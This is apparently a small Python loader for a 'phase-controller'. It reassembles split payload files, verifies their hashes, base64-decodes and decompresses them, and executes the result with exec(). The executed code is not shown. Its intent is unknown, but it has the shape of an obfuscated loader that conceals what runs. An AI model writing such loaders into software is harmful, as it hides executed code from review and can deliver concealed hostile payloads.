from pathlib import Path
import base64
import hashlib
import zlib

root = Path(__file__).resolve().parent
payload = "".join(path.read_text(encoding="utf-8") for path in sorted(root.glob("discovery_execution_payload.part*")))
if hashlib.sha256(payload.encode("utf-8")).hexdigest() != "a70d366d2c8db3067cccce38020f125a51911a3de0bcefc64ecad222d73142a8":
    raise RuntimeError("phase-controller payload checksum mismatch")
source = zlib.decompress(base64.b64decode(payload))
if hashlib.sha256(source).hexdigest() != "eda036741e2d19e0c101407bfa5f9c0ce516a75a3de73ba1e51180c651923b28":
    raise RuntimeError("phase-controller source checksum mismatch")
exec(compile(source, __file__, "exec"))
